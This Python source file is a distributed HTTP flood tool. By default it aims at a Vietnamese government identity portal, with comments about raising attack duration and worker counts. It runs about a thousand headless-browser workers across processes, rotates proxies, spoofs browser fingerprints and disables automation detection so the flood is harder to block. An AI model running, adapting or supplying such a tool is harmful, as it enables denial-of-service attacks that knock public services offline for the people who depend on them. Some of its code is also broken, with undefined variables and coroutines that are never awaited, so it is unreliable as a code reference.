import asyncio
import random
import time
import os
import json
import base64
import aiohttp
import multiprocessing
from playwright.async_api import async_playwright
from concurrent.futures import ThreadPoolExecutor
import uvloop

# Set uvloop as the event loop policy for better performance
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

TARGET_URL = os.getenv("TARGET_URL", "https://vneid.gov.vn/")
DURATION = int(os.getenv("DURATION", "300"))   # tăng thời gian tấn công
CONCURRENCY = int(os.getenv("CONCURRENCY", "1000"))  # tăng số lượng worker x20
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "100"))  # tăng số request mỗi vòng x5
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "1"))  # giảm số lần thất bại cho phép
PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "5"))  # giảm thời gian chờ
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "120000"))  # tăng timeout
MAX_RETRIES = int(os.getenv("MAX_RETRIES", "10"))  # tăng số lần thử lại
MIN_DELAY = float(os.getenv("MIN_DELAY", "0.1"))  # giảm độ trễ tối thiểu
MAX_DELAY = float(os.getenv("MAX_DELAY", "0.5"))  # giảm độ trễ tối đa
STEALTH_MODE = os.getenv("STEALTH_MODE", "true").lower() == "true"  # chế độ stealth
PARALLEL_PROCESSING = int(os.getenv("PARALLEL_PROCESSING", "10"))  # số tiến trình song song

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

# Global variables for multiprocessing
manager = None
success_counter = None
fail_counter = None
status_counter_dict = None

class HighPerformanceProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.proxy_status = {proxy: {"failures": 0, "last_failure": 0, "blocked": False, "success_count": 0, "response_times": [], "last_used": 0} for proxy in self.proxies}
        self.current_proxy_index = 0
        self.lock = asyncio.Lock()
        self.proxy_performance = {}
        self.session_cookies = {}
        self.session_headers = {}
        self.connection_pools = {proxy: [] for proxy in self.proxies}
        self.proxy_usage_count = {proxy: 0 for proxy in self.proxies}
    
    def load_proxies(self):
        """Load proxies from file"""
        proxies = []
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
            print(f"Loaded {len(proxies)} proxies from {self.proxy_file}")
            return proxies
        except FileNotFoundError:
            print(f"Proxy file {self.proxy_file} not found. Running without proxies.")
            return []
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return []
    
    async def get_next_proxy(self, worker_id):
        """Get next available proxy based on performance with round-robin for workers"""
        async with self.lock:
            if not self.proxies:
                return None
            
            # Calculate performance score for each proxy
            for proxy in self.proxies:
                if proxy not in self.proxy_performance:
                    self.proxy_performance[proxy] = {
                        "success_count": 0,
                        "total_count": 0,
                        "response_times": [],
                        "score": 0.1,  # Default score for untested proxies
                        "worker_usage": {},  # Track which workers have used this proxy
                        "connection_pool_size": 10  # Number of connections in pool
                    }
                
                # Initialize worker usage if not exists
                if worker_id not in self.proxy_performance[proxy]["worker_usage"]:
                    self.proxy_performance[proxy]["worker_usage"][worker_id] = 0
            
            # Sort proxies by performance score (descending) and usage count (ascending)
            sorted_proxies = sorted(
                self.proxies, 
                key=lambda p: (
                    self.proxy_performance[p]["score"], 
                    -self.proxy_usage_count[p]
                ),
                reverse=True
            )
            
            # Try to find a proxy that's not blocked and not recently used by this worker
            for proxy in sorted_proxies:
                proxy_info = self.proxy_status[proxy]
                
                # Check if proxy is blocked or in cooldown
                current_time = time.time()
                if (not proxy_info["blocked"] and 
                    (current_time - proxy_info["last_failure"] > PROXY_COOLDOWN or 
                     proxy_info["failures"] < MAX_FAILURES)):
                    
                    # Check if this worker hasn't used this proxy recently
                    last_used = self.proxy_performance[proxy]["worker_usage"].get(worker_id, 0)
                    if current_time - last_used > 2:  # 2 seconds cooldown for same worker
                        # Mark proxy as used by this worker
                        self.proxy_performance[proxy]["worker_usage"][worker_id] = current_time
                        proxy_info["last_used"] = current_time
                        self.proxy_usage_count[proxy] += 1
                        return proxy
            
            # If all proxies are blocked or recently used, return the one with the highest score
            best_proxy = sorted_proxies[0] if sorted_proxies else None
            if best_proxy:
                self.proxy_performance[best_proxy]["worker_usage"][worker_id] = time.time()
                self.proxy_status[best_proxy]["last_used"] = time.time()
                self.proxy_usage_count[best_proxy] += 1
            return best_proxy
    
    async def mark_proxy_result(self, proxy, success, response_time=None, status_code=None, headers=None, cookies=None):
        """Mark a proxy result and update performance metrics"""
        if proxy and proxy in self.proxy_status:
            async with self.lock:
                if success:
                    self.proxy_status[proxy]["failures"] = 0
                    self.proxy_status[proxy]["last_failure"] = 0
                    self.proxy_status[proxy]["success_count"] += 1
                    
                    # Update performance metrics
                    if proxy in self.proxy_performance and response_time:
                        perf = self.proxy_performance[proxy]
                        perf["success_count"] += 1
                        perf["total_count"] += 1
                        perf["response_times"].append(response_time)
                        
                        # Keep only the last 5 response times for faster calculation
                        if len(perf["response_times"]) > 5:
                            perf["response_times"] = perf["response_times"][-5]
                        
                        # Recalculate score with more weight on success rate
                        success_rate = perf["success_count"] / max(1, perf["total_count"])
                        avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                        
                        # Score formula: success_rate * 20 - (avg_response_time / 1000)
                        perf["score"] = (success_rate * 20) - (avg_response_time / 1000)
                        
                        # Store session cookies and headers for successful requests
                        if cookies:
                            self.session_cookies[proxy] = cookies
                        if headers:
                            self.session_headers[proxy] = headers
                else:
                    self.proxy_status[proxy]["failures"] += 1
                    self.proxy_status[proxy]["last_failure"] = time.time()
                    
                    # Block proxy if it failed too many times
                    if self.proxy_status[proxy]["failures"] >= MAX_FAILURES:
                        self.proxy_status[proxy]["blocked"] = True
                        print(f"Proxy {proxy} blocked due to too many failures")
    
    def get_session_data(self, proxy):
        """Get session cookies and headers for a proxy"""
        return {
            "cookies": self.session_cookies.get(proxy, {}),
            "headers": self.session_headers.get(proxy, {})
        }
    
    def get_proxy_stats(self):
        """Get statistics about proxy status"""
        total = len(self.proxies)
        blocked = sum(1 for proxy in self.proxies if self.proxy_status[proxy]["blocked"])
        available = total - blocked
        
        # Get top 20 best proxies
        best_proxies = sorted(
            self.proxies, 
            key=lambda p: self.proxy_performance[p]["score"] if p in self.proxy_performance else 0,
            reverse=True
        )[:20]
        
        return {
            "total": total,
            "blocked": blocked,
            "available": available,
            "best_proxies": best_proxies
        }

async def make_hyper_request(context, url, proxy_manager, proxy, worker_id, max_retries=MAX_RETRIES):
    """Make a hyper-performance request with retry logic and performance tracking"""
    start_time = time.time()
    
    # Get session data for this proxy
    session_data = proxy_manager.get_session_data(proxy)
    
    for attempt in range(max_retries + 1):
        try:
            # Add minimal random delay before making request
            delay = random.uniform(MIN_DELAY, MAX_DELAY)
            await asyncio.sleep(delay)
            
            # Create custom headers with session data
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": random.choice(ACCEPT_LANG),
                "Cache-Control": "max-age=0",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1"
            }
            
            # Add session headers if available
            if session_data["headers"]:
                headers.update(session_data["headers"])
            
            # Add random headers to simulate human behavior
            if random.random() > 0.7:
                headers["DNT"] = str(random.randint(0, 1))
            
            if random.random() > 0.8:
                headers["Sec-GPC"] = "1"
            
            # Make request with custom options
            response = await context.request.get(
                url, 
                timeout=REQUEST_TIMEOUT,
                headers=headers,
                extra_http_headers=headers if STEALTH_MODE else {}
            )
            
            response_time = int((time.time() - start_time) * 1000)  # Convert to milliseconds
            
            # Extract cookies from response
            cookies = {}
            if STEALTH_MODE:
                try:
                    response_cookies = await context.cookies()
                    for cookie in response_cookies:
                        cookies[cookie["name"]] = cookie["value"]
                except:
                    pass
            
            # Extract headers from response
            response_headers = {}
            if STEALTH_MODE:
                try:
                    response_headers = dict(response.headers)
                except:
                    pass
            
            # Mark proxy result
            await proxy_manager.mark_proxy_result(
                proxy, 
                response.ok, 
                response_time, 
                response.status,
                response_headers,
                cookies
            )
            
            return response
        except Exception as e:
            if attempt < max_retries:
                # Wait before retry (exponential backoff)
                wait_time = min(2 ** attempt, 5)  # Max wait time is 5 seconds
                await asyncio.sleep(wait_time)
            else:
                # Mark proxy as failed
                await proxy_manager.mark_proxy_result(proxy, False)
                raise e

async def hyper_attack(playwright, worker_id, proxy_manager):
    """Hyper-performance attack function"""
    # Get initial proxy
    proxy = await proxy_manager.get_next_proxy(worker_id)
    
    browser_args = [
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-setuid-sandbox",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        "--disable-software-rasterizer",
        "--disable-extensions",
        "--disable-plugins",
        "--disable-images",
        "--disable-javascript-har-prometheus-prometheus",
        "--disable-blink-features=AutomationControlled",
        "--disable-web-security",
        "--disable-features=VizDisplayCompositor",
        "--single-process",  # Run in single process mode for better performance
        "--disable-features=IsolateOrigins,site-per-process"  # Disable site isolation for better performance
    ]
    
    # Add stealth arguments if in stealth mode
    if STEALTH_MODE:
        browser_args.extend([
            "--disable-blink-features=AutomationControlled",
            "--disable-web-security",
            "--disable-features=VizDisplayCompositor"
        ])
    
    # Launch browser with or without proxy
    if proxy:
        try:
            browser = await playwright.chromium.launch(
                headless=True,
                proxy={
                    "server": proxy
                },
                args=browser_args
            )
            print(f"Worker {worker_id} using proxy: {proxy}")
        except Exception as e:
            print(f"Worker {worker_id}: Failed to launch browser with proxy {proxy}: {e}")
            # Try without proxy
            browser = await playwright.chromium.launch(
                headless=True,
                args=browser_args
            )
            print(f"Worker {worker_id} running without proxy after failure")
            proxy = None
    else:
        browser = await playwright.chromium.launch(
            headless=True,
            args=browser_args
        )
        print(f"Worker {worker_id} running without proxy")
    
    # Create context with stealth options
    context_options = {
        "user_agent": random.choice(USER_AGENTS),
        "extra_http_headers": {
            "Accept-Language": random.choice(ACCEPT_LANG),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1"
        },
        "ignore_https_errors": True,
        "java_script_enabled": False,
        "bypass_csp": True
    }
    
    # Add stealth options if enabled
    if STEALTH_MODE:
        context_options.update({
            "viewport": {
                "width": random.randint(1024, 1920),
                "height": random.randint(768, 1080)
            },
            "geolocation": {
                "latitude": random.uniform(-90, 90),
                "longitude": random.uniform(-180, 180),
                "accuracy": random.randint(1, 100)
            },
            "locale": random.choice(["en-US", "vi-VN", "ja-JP"])
        })
    
    context = await browser.new_context(**context_options)

    start = time.time()
    consecutive_failures = 0
    proxy_rotation_count = 0
    max_proxy_rotations = 100  # Increased maximum number of proxy rotations per worker
    
    # Create a thread pool for concurrent requests
    thread_pool = ThreadPoolExecutor(max_workers=50)
    
    while time.time() - start < DURATION and proxy_rotation_count < max_proxy_rotations:
        try:
            # Create tasks with random delays to simulate human behavior
            tasks = []
            
            # Use ThreadPoolExecutor for concurrent requests
            loop = asyncio.get_event_loop()
            
            for i in range(REQ_PER_LOOP):
                # Add random delay between requests
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                tasks.append(asyncio.sleep(delay))
                
                # Use run_in_executor to run the request in a thread pool
                tasks.append(loop.run_in_executor(
                    thread_pool,
                    lambda: make_hyper_request(context, TARGET_URL, proxy_manager, proxy, worker_id)
                ))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)

            batch_success = 0
            batch_fail = 0

            # Process only the request results (skip sleep results)
            for i, res in enumerate(results):
                if i % 2 == 1:  # Every other result is a request (odd indices)
                    if isinstance(res, Exception):
                        batch_fail += 1
                        status_count["exception"] = status_count.get("exception", 0) + 1
                    else:
                        if res.ok:
                            batch_success += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
                        else:
                            batch_fail += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
            
            # Update global counters
            with success_counter.get_lock():
                success_counter.value += batch_success
            with fail_counter.get_lock():
                fail_counter.value += batch_fail
            
            # Check if we need to rotate proxy
            if proxy:
                total_requests = batch_success + batch_fail
                success_rate = batch_success / total_requests if total_requests > 0 else 0
                
                if success_rate < 0.03:  # Lower threshold for proxy rotation (3%)
                    consecutive_failures += 1
                    
                    # If too many consecutive failures, rotate proxy
                    if consecutive_failures >= 1:  # Faster rotation
                        print(f"Worker {worker_id}: Low success rate ({success_rate:.2%}) with proxy {proxy}, rotating...")
                        
                        # Close current browser and context
                        await context.close()
                        await browser.close()
                        
                        # Get new proxy
                        new_proxy = await proxy_manager.get_next_proxy(worker_id)
                        if new_proxy != proxy:
                            proxy = new_proxy
                            proxy_rotation_count += 1
                            print(f"Worker {worker_id} switched to new proxy ({proxy_rotation_count}/{max_proxy_rotations}): {proxy}")
                            
                            # Launch new browser with new proxy
                            try:
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    proxy={
                                        "server": proxy
                                    },
                                    args=browser_args
                                )
                                context = await browser.new_context(**context_options)
                            except Exception as e:
                                print(f"Worker {worker_id}: Failed to launch browser with new proxy {proxy}: {e}")
                                # Try without proxy
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    args=browser_args
                                )
                                context = await browser.new_context(**context_options)
                                proxy = None
                        
                        consecutive_failures = 0
                else:
                    # If batch was successful, reset consecutive failures
                    consecutive_failures = 0
            
        except Exception as e:
            print(f"Worker {worker_id}: Error in batch: {e}")
            if proxy:
                await proxy_manager.mark_proxy_result(proxy, False)
    
    # Clean up
    await context.close()
    await browser.close()
    thread_pool.shutdown(wait=True)

def run_attack_process(process_id, proxy_manager_class, worker_count_per_process):
    """Run attack in a separate process"""
    # Initialize process-specific variables
    process_success = 0
    process_fail = 0
    process_status = {}
    
    async def process_main():
        nonlocal process_success, process_fail, process_status
        
        # Initialize proxy manager for this process
        proxy_manager = proxy_manager_class(PROXY_FILE)
        
        async with async_playwright() as p:
            # Create tasks for each worker in this process
            tasks = []
            for i in range(worker_count_per_process):
                worker_id = f"P{process_id}W{i}"
                tasks.append(hyper_attack(p, worker_id, proxy_manager))
            
            await asyncio.gather(*tasks)
        
        # Update global counters
        with success_counter.get_lock():
            success_counter.value += process_success
        with fail_counter.get_lock():
            fail_counter.value += process_fail
        
        # Update status counter
        with status_counter_dict.get_lock():
            for status, count in process_status.items():
                if status in status_counter_dict:
                    status_counter_dict[status] += count
                else:
                    status_counter_dict[status] = count
    
    # Run the async main function
    asyncio.run(process_main())

async def main():
    global manager, success_counter, fail_counter, status_counter_dict
    
    # Initialize multiprocessing variables
    manager = multiprocessing.Manager()
    success_counter = manager.Value('i', 0)
    fail_counter = manager.Value('i', 0)
    status_counter_dict = manager.dict()
    
    # Print initial information
    print(f"Starting hyper-performance attack with {PARALLEL_PROCESSING} processes and {CONCURRENCY} total workers")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {DURATION} seconds")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Stealth Mode: {STEALTH_MODE}")
    
    # Create and start processes
    processes = []
    workers_per_process = CONCURRENCY // PARALLEL_PROCESSING
    
    for i in range(PARALLEL_PROCESSING):
        process = multiprocessing.Process(
            target=run_attack_process,
            args=(i, HighPerformanceProxyManager, workers_per_process)
        )
        processes.append(process)
        process.start()
        print(f"Started process {i} with {workers_per_process} workers")
    
    # Wait for all processes to complete
    for process in processes:
        process.join()
    
    # Calculate final results
    total = success_counter.value + fail_counter.value
    
    print(f"\n=== Hyper-Performance Flood Result ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {DURATION} seconds")
    print(f"Total processes: {PARALLEL_PROCESSING}")
    print(f"Total workers: {CONCURRENCY}")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Stealth Mode: {STEALTH_MODE}")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success_counter.value}")
    print(f"Fail/Blocked: {fail_counter.value}")
    print(f"Success rate: {success_counter.value/total*100:.2f}%")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", dict(status_counter_dict))

if __name__ == "__main__":
    asyncio.run(main())
